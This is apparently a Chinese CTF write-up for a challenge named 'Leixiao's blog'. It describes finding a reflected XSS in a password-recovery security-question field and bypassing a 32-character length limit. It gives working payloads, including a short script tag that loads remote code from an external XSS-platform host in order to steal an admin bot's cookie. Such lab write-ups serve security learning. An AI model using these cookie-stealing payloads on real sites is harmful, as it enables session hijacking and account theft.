# Leixiao's blog --淚笑
## 考察知识点：
### 1.xss
### 2.信息收集

进入界面，注册账号登陆，发现一个Wrinting写的东西会在首页回显，但是主页只有自己的用户能看到，构造的xss,抓不到管理员cookie

继续浏发现密码找回处，的密保问题有回显

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/9F330BC3EF574AF7B415E0314E7B5062Leixiao's%20blog%20--淚笑1.png)

观察value值构造xss:"><scRipT>alert(1);</sCriPt>
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/6E8AF331D4BD4293B0E3E699F815944BLeixiao's%20blog%20--淚笑2.png)

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/F62BA2E422DF4955A152212984C6B101Leixiao's%20blog%20--淚笑3.png)

找回12139密码时：弹出了 1

此时构造能获取cookie的payload,采用xss平台的payload:`<Img sRC=http://xssye.com/eLIt.jpg>`

但是发现有长度限制，不能超过32位

采用xss平台最短，payload:<sCRiPt/SrC=//xssye.com/eLIt>
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/FC10620D4DC0428C8AF15B891CAAA0FELeixiao's%20blog%20--淚笑4.png)

注册为12141用户，当访问12141用户的忘记密码界面时即会触发xss

将12141用户忘记密码连接发送到用户后台，后台机器人会去触发，即可拿到flag

